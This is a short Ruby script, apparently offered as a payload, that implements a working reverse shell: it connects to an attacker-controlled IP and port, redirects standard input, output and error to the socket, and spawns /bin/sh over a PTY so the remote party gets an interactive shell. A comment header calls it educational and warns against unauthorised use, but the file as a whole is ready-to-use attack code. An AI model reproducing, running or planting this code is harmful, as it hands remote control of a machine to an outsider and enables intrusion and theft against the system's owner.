require 'socket'
require 'pty'

# Developed by veilwr4ith
# WARNING: This script is intended for educational purposes only.
# NEVER USE THIS PAYLOAD FOR ILLEGAL ACTIVITIES. Unauthorized use
# of this script can result in serious legal consequences. Use
# responsibly and only in environments where you have explicit permission.

# Define the IP address and port of the attacker's server
server_ip = '192.168.206.107' # Replace with your IP address
server_port = 1234 # Replace with your port number

# Create a TCP socket using IPv4 and TCP protocol
socket = TCPSocket.new(server_ip, server_port)

# Redirect standard input, output, and error streams to the socket
$stdin.reopen(socket)
$stdout.reopen(socket)
$stderr.reopen(socket)

# Spawn a new shell process and connect it to the socket
PTY.spawn('/bin/sh') do |r, w, pid|
  # Transfer data between the PTY and the socket
  Thread.new { IO.copy_stream(r, socket) }
  IO.copy_stream(socket, w)
end

